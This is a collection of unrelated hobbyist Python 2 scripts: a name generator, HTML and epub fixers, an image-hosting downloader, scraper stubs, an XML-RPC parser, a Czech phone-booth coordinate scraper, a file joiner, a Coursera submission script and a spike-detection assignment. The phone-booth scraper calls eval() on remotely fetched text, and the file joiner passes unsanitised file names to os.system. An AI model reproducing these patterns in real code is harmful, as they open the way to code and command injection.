            random.randint(0, size)
        )
        for _ in range(20)
    ]
    splits = [x for x in splits if x and len(x) <= 4]

    return splits


def count_vowels(word):
    return sum(1 for vowel in VOWELS if vowel in word)


def prioritize_vowels(splits):
    return [
        x for x in splits
        if count_vowels(x) > 0 or random.choice((True, False))
    ]


def repeat_penalty(word):
    old = ""
    score = 0
    penalty = 0
    for char in list(word) + [""]:
        if char == old and char in VOWELS:
            penalty += 1
        else:
            score += penalty ** 3
            penalty = 0

        old = char

    score += penalty ** 3
    return score


def mix(words, num):
    splits = [
        prioritize_vowels(split_word(word))
        for word in words
    ]
    splits = sum(splits, [])

    candidates = list(set(
        "".join(
            random.choice(splits)
            for j in range(random.randint(0, 4))
        )
        for _ in range(num * 20)
    ))

    smallest = min(words, key=lambda x: len(x))
    longest = max(words, key=lambda x: len(x))

    def is_bad(word):
        if len(word) < len(smallest):
            return True

        if len(word) > len(longest * 2):
            return True

        if count_vowels(word) > (len(word) / 2) + 1:
            return True

        if repeat_penalty(word) > 2:
            return True

        return False

    candidates = [
        x for x in candidates
        if not is_bad(x)
    ]

    output = set()
    while len(output) < num:
        output.add(
            random.choice(candidates)
        )

    return output


# Main program ================================================================
if __name__ == '__main__':
    import os.path
    import argparse

    parser = argparse.ArgumentParser(
        description="Mix random names from word seeds."
    )
    parser.add_argument(
        "-n",
        "--number",
        type=int,
        default=20,
        help="Number of generated words. Default 20.",
    )
    parser.add_argument(
        "SEED_FILE",
        help="File with list of seed words. Use - for stdin.",
    )
    args = parser.parse_args()

    if not os.path.exists(args.SEED_FILE):
        print("`%s` not found!" % args.SEED_FILE, file=sys.stderr)
        sys.exit(1)

    words = get_words(args.SEED_FILE)

    for x in mix(words, args.number):
        print(x)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import os.path

import dhtmlparser
from dhtmlparser import first


# Variables ===================================================================
# Functions & classes =========================================================
def iter_html():
    for fn in os.listdir("."):
        if fn.endswith("html"):
            yield fn


def has_tag(tag):
    sub_tags = tag.find(
        "",
        fn=lambda x: x.isOpeningTag() and x != tag
    )

    return len(sub_tags) > 0


def flush_cache(cache):
    if not cache:
        return None

    out = (" ".join(cache)).strip()

    if not out:
        return out

    return first(
        dhtmlparser.parseString("<p>%s</p>\n" % out).find("p")
    )


def is_int(s):
    try:
        int(s)
    except ValueError:
        return False

    return True


def fix_html(data):
    dom = dhtmlparser.parseString(data)

    cache = []
    new_content = []
    for p in dom.find("p"):
        if has_tag(p):
            new_content.append(flush_cache(cache))
            new_content.append(p)
            cache = []
            continue

        content = p.getContent().strip()

        if is_int(content):
            continue

        cache.append(content)

        if content and (content[-1] in [".", "'", '"'] or
                        content.endswith("“")):
            new_content.append(flush_cache(cache))
            cache = []

    new_content.append(flush_cache(cache))
    new_content = [
        tag for tag in new_content
        if tag
    ]

    first(dom.find("body")).childs = new_content

    return dom.prettify()


def process_fn(fn):
    with open(fn) as f:
        data = f.read()

    # if not os.path.exists("out"):
    #     os.mkdir("out")
    new_fn = fn #os.path.join("out", fn)

    with open(new_fn, "w") as f:
        f.write(
            fix_html(data)
        )


# Main program ================================================================
if __name__ == '__main__':
    for fn in iter_html():
        print fn
        process_fn(fn)
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os

import sh


# Functions & classes =========================================================
def fix_all(path="."):
    for fn in os.listdir("."):
        if not fn.endswith(".epub"):
            continue

        fns = fn.split(".")
        nfn = fns[0] + "_fixed." + fns[-1]

        sh.ebook_convert(fn, nfn)


# Main program ================================================================
if __name__ == '__main__':
    fix_all()
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import os
import sys
import os.path

import httpkie
import dhtmlparser

from retrying import retry
from timeout_wrapper import timeout, TimeoutException


# Variables ===================================================================
DOWNER = httpkie.Downloader()


# Functions & classes =========================================================
def get_local_name(dirname, link):
        return os.path.join(
            dirname,
            os.path.basename(link)
        )


def get_dirname(filename):
    return filename.split(".")[0]


def download_imageshack(link):
    data = DOWNER.download(link)
    dom = dhtmlparser.parseString(data)

    # get direct link
    direct_link = dom.find("a", {"data-label": "Download Image"})

    # check existence of `direct_link` HTML element
    if not direct_link:
        print "imageshack shiit"
        sys.exit(1)

    # parse actual link
    direct_link = direct_link[0].params.get("href", None)

    # check whether the link was really there
    if not direct_link:
        print "imageshack shiit 2"
        sys.exit(1)

    # fix the link in case that it is broken (it usually is)
    if direct_link.startswith("//"):
        direct_link = "http:" + direct_link

    return direct_link, DOWNER.download(direct_link)


def download_photobucket(link):
    data = DOWNER.download(link)
    dom = dhtmlparser.parseString(data)

    # get div with copy code
    copy_code1 = dom.find("div", {"id": "linksModule_copycode_1"})

    # check whether the div with copy_code1 was really found
    if not copy_code1:
        print "shiit"
        sys.exit(1)

    # get direct link
    direct_link = copy_code1[0].params.get("data-clipboard-text", None)

    # check whether direct_link was really found
    if not direct_link:
        print "shiit direct"
        sys.exit(1)

    # ...
    DOWNER.headers["Referer"] = link

    # get link without crap at the end
    if direct_link.endswith("~original"):
        link = direct_link.split("~original")[0]
    else:
        link = link

    return link, DOWNER.download(direct_link)


@retry(stop_max_attempt_number=5, wait_fixed=5000)
@timeout(30)
def download_link(link):
    # choose from where to download
    if "imageshack.us/" in link:
        return download_imageshack(link)
    elif "photobucket.com/" in link:
        return download_photobucket(link)
    else:
        raise ValueError("unknown link: " + link)


def process_html(dirname, html):
    dom = dhtmlparser.parseString(html)

    links = dom.find("a")
    how_much = len(links)
    for cnt, a in enumerate(links):
        link = a.params.get("href", None)

        # skip links without parameters
        if not link:
            continue

        # download data
        try:
            pic_link, pic_data = download_link(link)
        except Exception, e:
            with open("faill.log", "at") as f:
                f.write(link + "\n")
            continue

        # save picture to disk
        new_link = get_local_name(dirname, pic_link)
        with open(new_link, "wb") as pic:
            print "%d/%d; %s" % (cnt, how_much, pic_link)
            pic.write(pic_data)

        # update reference to picture to localized version
        a.params["href"] = new_link

    return str(dom)  # return updated webpage


def process_files(filelist):
    for fn in filelist:
        # create directory, if not already exists
        dirname = get_dirname(fn)
        if not os.path.exists(dirname):
            os.mkdir(dirname)

        # process HTML file
        with open(fn) as f:
            new_html = process_html(dirname, f.read())

        # save new version of HTML to disk
        with open(dirname + "_localized.html", "w") as f:
            f.write(new_html)


# Main program ================================================================
if __name__ == '__main__':
    process_files(
        filter(
            lambda x: x.endswith(".html") and "localized" not in x,
            os.listdir(".")
        )
    )
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================
def parse():
    return "seznam scrapper"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================



# Main program ================================================================
if __name__ == '__main__':
    pass
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================



# Variables ===================================================================



# Functions & classes =========================================================
def parse():
    return "jobs scrapper"
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# This is dynamic module loader example for devel.cz
# (http://devel.cz/otazka/refaktor-web-scraperu)
#
# Imports =====================================================================
import os
import sys


def get_submodules(path="scrappers", func_name="parse"):
    for fn in os.listdir(path):
        if "scrapper" not in fn or fn.endswith(".pyc"):
            continue

        module_name = fn.split(".")[0]
        module_notation = path + "." + module_name  # python module path

        # import module to local namespace
        __import__(module_notation)

        # get reference to module from module pool
        module_ref = sys.modules[module_notation]

        # skip the modules without parse() function
        if not hasattr(module_ref, func_name):
            continue

        yield module_ref.parse


for parse in get_submodules():
    print parse()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2013"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys

from mfn import filterbullshit as fb
from mfn import web



#= Variables ===================================================================



#= Functions & objects =========================================================
def pickLink():
	for i in sys.argv:
		if i.startswith("http"):
			return i

	raise UserException("Link not found")



#= Main program ================================================================
if __name__ == '__main__':
	data = web.getPage(pickLink())

	print fb.filterBullshit(data)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in gedit text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys
import time


#= Variables ===================================================================



#= Functions & objects =========================================================



#= Main program ================================================================
data = filter(lambda x: not (x.strip().startswith("#") or x.strip() == ""), sys.stdin.readlines())

print "# datum, pocet prispevku, rozdil prispevku"
last = 0
for i in data:
	i = i.strip()
	t, n = i.split(", ")
	n = int(n)
	d = time.strftime("%d.%m.%y", time.localtime(int(t)))

	delta = n - last 
	delta = "+" + str(delta) if delta > 0 else str(delta)

	print d + ", " + str(n) + ", " + delta

	last = int(n)



#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Interpreter version: python 2.7
#
# Imports =====================================================================
import httpkie
import dhtmlparser as d


# Variables ===================================================================
DOWNER = httpkie.Downloader()
DOWNER.headers["Content-Type"] = "text/xml"


# Functions & objects =========================================================
def _XMLRPC2dict(xml):
    """
    Convert XML-RPC response to python dictionary with matching types.
    http://cs.wikipedia.org/wiki/XML-RPC
    """

    def getNonblank(arr):
        return filter(lambda x: len(str(x).strip()) > 0, arr)

    def processValue(value):
        """
        Return appropriate value for given tag. std for
        <value><string>..</string></value> and so on.
        """

        if not value.isTag():
            return value.getContent()

        if value.getTagName() == "i4" or value.getTagName() == "int":
            return int(value.getContent())
        elif value.getTagName() == "double":
            return float(value.getContent())
        elif value.getTagName() == "boolean":
            return value.getContent().strip() == "1"
        elif value.getTagName() == "string":
            return value.getContent()
        elif value.getTagName().startswith("datetime"):
            return value.getContent()
        elif value.getTagName() == "struct":
            return _XMLRPC2dict(value)
        elif value.getTagName() == "array":
            value = value.find("data")
            if len(value) == 0:
                return []
            else:
                value = value[0]
                out = []
                for v in value.childs:
                    if str(v).strip() != 0:
                        if len(v.childs) > 0:
                            out.append(processValue(getNonblank(v.childs)[0]))
                return out
        else:
            return "unimplemented: " + str(value)

    # check if input was parsed - if not, parse it
    if type(xml) == str:
        xml = d.parseString(xml)

    out = {}
    xml = xml.find("struct")[0]
    for member in xml.find("member"):
        name  = member.find("name")[0].getContent()
        value = member.find("value")[0]

        # filter only nonblank childs
        value.childs = getNonblank(value.childs)

        if len(value.childs) == 0:    # blank values
            value = None
        elif len(value.childs) == 1:  # most of values should fall there
            value = processValue(value.childs[0])
        else:                         # and this shouldn't happen at all
            new_val = []
            for v in value.childs:
                new_val.append(processValue(v))
            value = new_val

        out[name] = value

    return out



# Main program ================================================================
if __name__ == '__main__':
    print DOWNER.download("https://www.lide.cz/RPC2", post="""
        <methodCall>
            <methodName>Lide.State</methodName>
        </methodCall>
    """
    )
    
    # DOWNER.download("https://www.lide.cz")
    # print DOWNER.download(
    #     "https://www.lide.cz/RPC2",
    #     post="""
    #     <methodCall>
    #       <methodName>system.methodHelp</methodName>
    #       <params>
    #         <param>
    #             <value>
    #                 system.methodHelp
    #             </value>
    #         </param>
    #       </params>
    #     </methodCall>
    # """
    # )

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# SouradniceBudek.py v1.0.0 (02.06.2010) by Bystroushaak (bystrousak@kitakitsune.org)
#
# Tento program zjisti souradnice vsech telefonnich budek v ceske republice. Presnost je na par metru,
# ale predpokladam ze se to da upresnit pomoci udaju ulozenych v databazi pod kolonkou ostatni.
# Udaje jsou ulozeny do souboru telefonni_budky.sqlite ve formatu sqlite.
#   
# Notes:
    # 
#===============================================================================
# Imports ======================================================================
#===============================================================================
from sqlite3 import dbapi2 as sqlite
import sqlite3
import urllib
import os
import os.path
import sys


#===============================================================================
# Variables ====================================================================
#===============================================================================
DATABASE_NAME = "telefonni_budky.sqlite"

db = None
if not os.path.exists(DATABASE_NAME):
    db = sqlite.connect(DATABASE_NAME)
    db.execute("""
        CREATE TABLE Budky(
            id INTEGER PRIMARY KEY UNIQUE,
            id2 VARCHAR(30),
            telefonni_cislo VARCHAR(25), 
            location VARCHAR(25), 
            city VARCHAR(50),
            street TEXT, 
            psc VARCHAR(6), 
            umisteni TEXT, 
            kategorie VARCHAR(50), 
            euro VARCHAR(10), 
            sms VARCHAR(10), 
            ostatni TEXT
        )
    """)
else:
    db = sqlite.connect(DATABASE_NAME)
    
db.text_factory = sqlite3.OptimizedUnicode

start_loc = [51.027202 + 1, 11.899937 - 1]   # pravej horni roh pomyslneho ctverce ktery obsahuje nasi republiku
end_loc = [48.526232 - 1, 19.14148 + 1]      # levej dolni
max_move = [0.3, 0.5]
DBG = False # pokud je nastaveno na True, vypisuje ladici informace

#===============================================================================
#= Functions & objects =========================================================
#===============================================================================
def clear():
    if os.name == "posix":
        os.system('clear')
    elif os.name in ("nt", "dos", "ce"):
        os.system('CLS')
    else: 
        pass

def getArea(loc):
    loc = str(loc[0])[:9] + "%3b" + str(loc[1])[:9]
    url = "http://mapy.1188.cz/user/map.php?S=AwYcAAAAAMgZSUEAAAAAd7NWQUdhdXNzIFBhczMAFQAAAACAhE5BF1BCMgABAA__&PX=248&PY=875&M=ngid111&W=1242&H=585&C=HY_4&P=&L=" + loc + "&SC=2000000&POIID=telephonebox"

    fp = urllib.urlopen(url)
    data = fp.read().splitlines()
    fp.close()
    
    for line in data:
        if line.startswith("m.ActiveLayersParams"):
            budky = line.replace("m.ActiveLayersParams={'poi:phoneboxes':{", "").replace("}}};", "").replace("&nbsp;", " ")

            if DBG:
                print "Pridavam zakladni udaje o budce;"

            for budka in budky.split("},"):
                try:    # na mistech kde zadna budka neni by to zpusobilo chybu
                    id, zbytek = budka.split("':")
                except:
                    continue
                    
                id = id.replace("'", "")
                
                zbytek = zbytek + "}"
                info = eval(zbytek.replace(":'", "':'").replace("',", "','").replace("{", "{'"))
                
                try:
                    db.execute(
                        """INSERT INTO Budky(id, city, street, psc, umisteni, kategorie, euro, sms) VALUES(?, ?, ?, ?, ?, ?, ?, ?)""",
                        (id, info["City"], info["Street"], info["Psc"], info["Umisteni"], info["Kategorie"], info["Euro"], info["Sms"])
                    )
                    
                    if DBG:
                        print "\tBudka cislo", id
                        
                except sqlite3.IntegrityError:
                    pass # budka uz v db je
                    
        elif line.startswith("m.SetActiveLayers"):
            budky = line.replace("m.SetActiveLayers(new Array(new AL('poi:phoneboxes', new Array(new AO", "").replace("))));", "")
            budky = budky.split(",new AO")
            
            if DBG:
                print "Pridavam rozsirene informace:"
                
            for budka in budky:
                info = eval(budka)
                
                id  = info[4] 
                id2 = info[-1]
                tel = info[5]
                
                if len(id2) < 9:
                    print info
                    print budka
                exit
                
                if "Tel: " in tel:
                    tel = tel.replace("Tel: ", "")
                
                if DBG:
                    print "\t" + id + ":\t" + id2 + "\t(" + tel + ")"
                    
                db.execute("UPDATE Budky SET id2=?, telefonni_cislo=? WHERE id = ?", (id2, tel, id))
    
    db.commit()
    
def printPic(obr, work_loc):
    clear()
    
    print
    print "Skenuji mapu .. (" + str(work_loc[0])[:9] + ";" + str(work_loc[1])[:9] + ")"
    print
    print
    print
    
    for i in range(len(obr)):
        print "  ".join(obr[i]).center(80)
        
    for i in range(4):
        print
        
     
def getLoc(eid2):
    url = "http://mapy.1188.cz/user/map.php?S=AwYcAAAAAICEHkEAAAAAwFxVQVVUTVpvbmUzMwAVAAAAAICEHkEXUEIyAAEA&PX=&PY=&M=ngid111&W=5&H=5&C=L_30&P=" + eid2 + "&SC=max&POIID=telephonebox"
    
    fp = urllib.urlopen(url)
    data = fp.read().splitlines()
    fp.close()
    
    ostatni = []
    pos = ""
    for line in data:
        if line.startswith("m.SetActiveLayers"):
            budky = line.replace("m.SetActiveLayers(new Array(new AL('poi:phoneboxes', new Array(", "")
            budky = budky.replace("))));", "").replace("),", ")")
            budky = budky.split("new AO")
            
            for budka in budky:
                if len(budka) < 10:
                    continue
                
                info = eval(budka)
                id = info[4]
                ostatni.append([id, str(str(info[1]) + "," + str(info[2]) + "," + str(info[3]))])
        elif line.startswith("m.MapPos="):
            pos = line.replace("m.MapPos='", "").replace("';", "")
    
    for i in ostatni:
        db.execute("UPDATE Budky SET location=?, ostatni=? WHERE id=?", (pos, i[1], i[0]))
        
    return pos
    
    
    
#===============================================================================
#= Main program ================================================================
#===============================================================================
work_loc= [0, 0]
work_loc[0], work_loc[1] = start_loc[0], start_loc[1]

# vypocet velikosti pro obrazek (jasne, slo to udelat vrozcem, ale desetinny mista bleee)
obr = []
cnt = 0
while work_loc[0] >= end_loc[0]:
    obr.append([])
    while work_loc[1] <= end_loc[1]:
        obr[cnt].append(".")
        work_loc[1] += max_move[1]
    cnt += 1
    work_loc[0] -= max_move[0]
    work_loc[1] = start_loc[1]


# projde celou mapu ceske republiky a sezene zaznamy o kazdem automatu
cnt = cnt2 = 0
work_loc[0], work_loc[1] = start_loc[0], start_loc[1]
print "Prochazim souradnice:"
while work_loc[0] >= end_loc[0]:
    while work_loc[1] <= end_loc[1]:
        getArea(work_loc)
        
        obr[cnt][cnt2] = "X"
        printPic(obr, work_loc)  
        
        work_loc[1] += max_move[1]
        
        cnt2+= 1

    cnt += 1    
    cnt2 = 0
    work_loc[0] -= max_move[0]
    work_loc[1] = start_loc[1]


# ------------------------------------------------------------------------------
# Zjistovani lokaci jednotlivych budek
# ------------------------------------------------------------------------------
clear()
loid2 = [] # list of id2
print "Enkoduji id2 .."
for i in db.execute("SELECT id2 FROM Budky"):
    loid2.append([i[0], urllib.urlencode({"s":i[0]})[2:]])  # dvojice id2, urlencoded_id2

cnt = 1
for id2, eid2 in loid2:
    print "Hledam souradnice budky", id2, "(" + str(cnt), "z", str(len(loid2)) + ") ..",
    
    print getLoc(eid2)
    
    if cnt % 50 == 0:
        db.commit()
    
    cnt += 1

db.close()#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# NONAME v0.0.0 (dd.mm.yy) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/cz/).
# Created in Geany text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import os
import os.path


#= Variables ===================================================================



#= Functions & objects =========================================================
def getClearName(fn):
	return ".".join(fn.split(".")[:-1])


#= Main program ================================================================
os.system("mkdir out")

l = []
for f in os.listdir("."):
	if os.path.isfile(f):
		if f.split(".")[-1][0] == "0":
			l.append(f)
		else:
			os.system("cp " + f + " out/")

l.sort()
last = ""
parts = []
for f in l:
	cn = getClearName(f)
	
	if cn != last and last != "":
		os.system("cat " + " ".join(parts) + " >> out/" + last)
		parts = [f]
	else:
		parts.append(f)
	
	last = cn

os.system("cat " + " ".join(parts) + " >> out/" + last)







### 
### Hello, curious student!  You shouldn't need to edit anything in this file 
###  (and if you do, there's a good chance you won't be able to upload your
###   answers to the problem set)
###
### All you need to do to submit your assigment is to "run" this file.  
###   In spyder:  load this in the editor and press the green arrow (or F5)
###   From the command prompt: "python problem_set1_submit.py"
###

import urllib
import urllib2
import hashlib
import random
import email
import email.message
import email.encoders
import StringIO
import sys
import datetime

""""""""""""""""""""
""""""""""""""""""""

class NullDevice:
  def write(self, s):
    pass

def submit():   
  print '==\n== [sandbox] Submitting Solutions \n=='
  
  (login, password) = loginPrompt()

  if not login:
    print '!! Submission Cancelled'
    return
  
  print '\n== Connecting to Coursera ... '

  # Part Identifier
#  (partIdx, sid) = partPrompt()

  for partIdx in range(10):
    sid = partIds[partIdx]

    print '\n== ' + str(partIdx+1) + ' ' + str(sid)

    # Get Challenge
    (login, ch, state, ch_aux) = getChallenge(login, sid) #sid is the "part identifier"
    if((not login) or (not ch) or (not state)):
      # Some error occured, error string in first return element.
      print '\n!! Error: %s\n' % login
      return
      
    # Attempt Submission with Challenge
    ch_resp = challengeResponse(login, password, ch)
    (result, string) = submitSolution(login, ch_resp, sid, output(partIdx), \
                                        source(partIdx), state, ch_aux)

    print '== %s' % string.strip()


# =========================== LOGIN HELPERS - NO NEED TO CONFIGURE THIS =======================================

def loginPrompt():
  """Prompt the user for login credentials. Returns a tuple (login, password)."""
  (login, password) = basicPrompt()
  return login, password


def basicPrompt():
  """Prompt the user for login credentials. Returns a tuple (login, password)."""
  login = raw_input('Login (Email address): ')
  password = raw_input('One-time Password (from the assignment page. This is NOT your own account\'s password): ')
  return login, password

def partPrompt():
  print 'Hello! These are the assignment parts that you can submit:'
  counter = 0
  for part in partFriendlyNames:
    counter += 1
    print str(counter) + ') ' + partFriendlyNames[counter - 1]
  partIdx = int(raw_input('Please enter which part you want to submit (1-' + str(counter) + '): ')) - 1
  return (partIdx, partIds[partIdx])

def getChallenge(email, sid):
  """Gets the challenge salt from the server. Returns (email,ch,state,ch_aux)."""
  url = challenge_url()
  values = {'email_address' : email, 'assignment_part_sid' : sid, 'response_encoding' : 'delim'}
  data = urllib.urlencode(values)
  req = urllib2.Request(url, data)
  response = urllib2.urlopen(req)
  text = response.read().strip()

  # text is of the form email|ch|signature
  splits = text.split('|')
  if(len(splits) != 9):
    print 'Badly formatted challenge response: %s' % text
    return None
  return (splits[2], splits[4], splits[6], splits[8])

def challengeResponse(email, passwd, challenge):
  sha1 = hashlib.sha1()
  sha1.update("".join([challenge, passwd])) # hash the first elements
  digest = sha1.hexdigest()
  strAnswer = ''
  for i in range(0, len(digest)):
    strAnswer = strAnswer + digest[i]
  return strAnswer 
  
def challenge_url():
  """Returns the challenge url."""
  return "https://class.coursera.org/" + URL + "/assignment/challenge"

def submit_url():
  """Returns the submission url."""
  return "https://class.coursera.org/" + URL + "/assignment/submit"

def submitSolution(email_address, ch_resp, sid, output, source, state, ch_aux):
  """Submits a solution to the server. Returns (result, string)."""
  source_64_msg = email.message.Message()
  source_64_msg.set_payload(source)
  email.encoders.encode_base64(source_64_msg)

  output_64_msg = email.message.Message()
  output_64_msg.set_payload(output)
  email.encoders.encode_base64(output_64_msg)
  values = { 'assignment_part_sid' : sid, \
             'email_address' : email_address, \
             'submission' : output_64_msg.get_payload(), \
             'submission_aux' : source_64_msg.get_payload(), \
             'challenge_response' : ch_resp, \
             'state' : state \
           }
  url = submit_url()  
  data = urllib.urlencode(values)
  req = urllib2.Request(url, data)
  response = urllib2.urlopen(req)
  string = response.read().strip()
  result = 0
  return result, string

## This collects the source code (just for logging purposes) 
def source(partIdx):
  # open the file, get all lines
  f = open(sourceFiles[partIdx])
  src = f.read() 
  f.close()
  return src



############ BEGIN ASSIGNMENT SPECIFIC CODE - YOU'LL HAVE TO EDIT THIS ##############

from problem_set1 import load_data, good_AP_finder
import numpy as np

# Make sure you change this string to the last segment of your class URL.
# For example, if your URL is https://class.coursera.org/pgm-2012-001-staging, set it to "pgm-2012-001-staging".
URL = 'neuraldata-001'

# the "Identifier" you used when creating the part
dev = ""


partIds = ['spikes-easy-%d%s' % (i,dev) for i in range(1,6)]+['spikes-hard-%d%s' % (i,dev) for i in range(1,6)]
# used to generate readable run-time information for students
partFriendlyNames = ['Spikes Easy %d/5' % (i) for i in range(1,6)]+['Spikes Hard %d/5' % (i) for i in range(1,6)]
# source files to collect (just for our records)
sourceFiles = ['problem_set1.py']*10
          
def first_after(time, spikes):
    spikes = np.array(spikes)
    if len(spikes) == 0 or spikes[-1] < time:
        return 0.0
    return spikes[np.where(spikes > time)][0]
         
def output(partIdx):
  """Uses the student code to compute the output for test cases."""
  outputString = ''

  if partIdx < 5: # This is spike_easy
      after_list = [.018, .15, 1.1, 1.7, 2.05]
      t,v = load_data('spikes_easy_test.npy')
      APTimes = good_AP_finder(t,v)
      result = [first_after(spk_time, APTimes) for spk_time in after_list]
      outputString = str(result[partIdx])+'\n'

  else: # This is spike_hard
      after_list = [ 0.095, 1.31,  1.32,  3.96, 5.97]
      t,v = load_data('spikes_hard_test.npy')
      APTimes = good_AP_finder(t,v)
      result = [first_after(spk_time, APTimes) for spk_time in after_list]
      outputString = str(result[partIdx-5])+'\n'
          
  return outputString.strip()

submit()
#
#  NAME
#    problem_set1.py
#
#  DESCRIPTION
#    Open, view, and analyze raw extracellular data
#    In Problem Set 1, you will write create and test your own spike detector.
#
import numpy as np
import matplotlib.pylab as plt


def _get_sample_rate(time):
    return len(time) / float(time[-1])


def load_data(filename):
    """
    load_data takes the file name and reads in the data.  It returns two
    arrays of data, the first containing the time stamps for when they data
    were recorded (in units of seconds), and the second containing the
    corresponding voltages recorded (in units of microvolts - uV)
    """
    data = np.load(filename)[()];
    return np.array(data['time']), np.array(data['voltage'])


def bad_AP_finder(time,voltage):
    """
    This function takes the following input:
        time - vector where each element is a time in seconds
        voltage - vector where each element is a voltage at a different time

        We are assuming that the two vectors are in correspondance (meaning
        that at a given index, the time in one corresponds to the voltage in
        the other). The vectors must be the same size or the code
        won't run

    This function returns the following output:
        APTimes - all the times where a spike (action potential) was detected

    This function is bad at detecting spikes!!!
        But it's formated to get you started!
    """

    #Let's make sure the input looks at least reasonable
    if (len(voltage) != len(time)):
        print "Can't run - the vectors aren't the same length!"
        APTimes = []
        return APTimes

    numAPs = np.random.randint(0,len(time))//10000 #and this is why it's bad!!

    # Now just pick 'numAPs' random indices between 0 and len(time)
    APindices = np.random.randint(0,len(time),numAPs)

    # By indexing the time array with these indices, we select those times
    APTimes = time[APindices]

    # Sort the times
    APTimes = np.sort(APTimes)

    return APTimes


def good_AP_finder(time, voltage):
    """
    This function takes the following input:
        time - vector where each element is a time in seconds
        voltage - vector where each element is a voltage at a different time

        We are assuming that the two vectors are in correspondance (meaning
        that at a given index, the time in one corresponds to the voltage in
        the other). The vectors must be the same size or the code
        won't run

    This function returns the following output:
        APTimes - all the times where a spike (action potential) was detected
    """
    APTimes = []

    #Let's make sure the input looks at least reasonable
    if (len(voltage) != len(time)):
        print "Can't run - the vectors aren't the same length!"
        return APTimes

    avg = sum(voltage) / len(voltage)
    treshold = avg + max(voltage) / 3

    spike_len = 0.002  # ms

    last_spike_t = -1
    for cnt, (time_sample, volt_sample) in enumerate(zip(time, voltage)):
        # make sure to detect spikes only once
        if not time_sample - last_spike_t > spike_len:
            continue

        if volt_sample > treshold:
            APTimes.append(time_sample)
            last_spike_t = time_sample

    return APTimes


def get_actual_times(dataset):
    """
    Load answers from dataset
    This function takes the following input:
        dataset - name of the dataset to get answers for

    This function returns the following output:
        APTimes - spike times
    """
    return np.load(dataset)


def detector_tester(APTimes, actualTimes):
    """
    returns percentTrueSpikes (% correct detected) and falseSpikeRate
    (extra APs per second of data)
    compares actual spikes times with detected spike times
    This only works if we give you the answers!
    """

    JITTER = 0.025 #2 ms of jitter allowed

    #first match the two sets of spike times. Anything within JITTER_MS
    #is considered a match (but only one per time frame!)

    #order the lists
    detected = np.sort(APTimes)
    actual = np.sort(actualTimes)

    #remove spikes with the same times (these are false APs)
    temp = np.append(detected, -1)
    detected = detected[plt.find(plt.diff(temp) != 0)]

    #find matching action potentials and mark as matched (trueDetects)
    trueDetects = [];
    for sp in actual:
        z = plt.find((detected >= sp-JITTER) & (detected <= sp+JITTER))
        if len(z)>0:
            for i in z:
                zz = plt.find(trueDetects == detected[i])
                if len(zz) == 0:
                    trueDetects = np.append(trueDetects, detected[i])
                    break;
    percentTrueSpikes = 100.0*len(trueDetects)/len(actualTimes)

    #everything else is a false alarm
    totalTime = (actual[len(actual)-1]-actual[0])
    falseSpikeRate = (len(APTimes) - len(actualTimes))/totalTime

    print 'Action Potential Detector Performance performance: '
    print '     Correct number of action potentials = ' + str(len(actualTimes))
    print '     Percent True Spikes = ' + str(percentTrueSpikes)
    print '     False Spike Rate = ' + str(falseSpikeRate) + ' spikes/s'
    print

    return {
        'Percent True Spikes': percentTrueSpikes,
        'False Spike Rate': falseSpikeRate
    }


def plot_spikes(time, voltage, APTimes, titlestr):
    """
    plot_spikes takes four arguments - the recording time array, the voltage
    array, the time of the detected action potentials, and the title of your
    plot.  The function creates a labeled plot showing the raw voltage signal
    and indicating the location of detected spikes with red tick marks (|)
    """
    fig = plt.figure()

    ax = fig.add_subplot(111)

    ax.set_title(titlestr)
    ax.set_xlabel("Time (s)")
    ax.set_ylabel("Voltage (uV)")

    ax.plot(time, voltage)
    ax.plot(
        APTimes,
        len(APTimes) * [max(voltage) + 20],
        "r|"
    )

    plt.show()


def plot_waveforms(time, voltage, APTimes, titlestr):
    """
    plot_waveforms takes four arguments - the recording time array, the voltage
    array, the time of the detected action potentials, and the title of your
    plot.  The function creates a labeled plot showing the waveforms for each
    detected action potential
    """
    fig = plt.figure()
    ax = fig.add_subplot(111)

    ax.set_title(titlestr)
    ax.set_xlabel("Time (s)")
    ax.set_ylabel("Voltage (uV)")

    sample_rate = _get_sample_rate(time)
    time_axis_original = np.linspace(-0.003, 0.003, sample_rate * 0.006)
    half_time = sample_rate * 0.006 / 2

    time_arr = list(time)
    for spike in APTimes:
        time_axis = time_axis_original

        spike_index = time_arr.index(spike)
        voltage_samples = voltage[
            spike_index - half_time: spike_index + half_time - 1
        ]

        volt_sampl_len = len(voltage_samples)
        if volt_sampl_len < len(time_axis):
            time_axis = time_axis[:volt_sampl_len]

        # print len(time_axis), "x", len(voltage_samples)

        ax.plot(time_axis, voltage_samples, "b")

    plt.show()



##########################
#You can put the code that calls the above functions down here
if __name__ == "__main__":
    t,v = load_data('spikes_easy_test.npy')
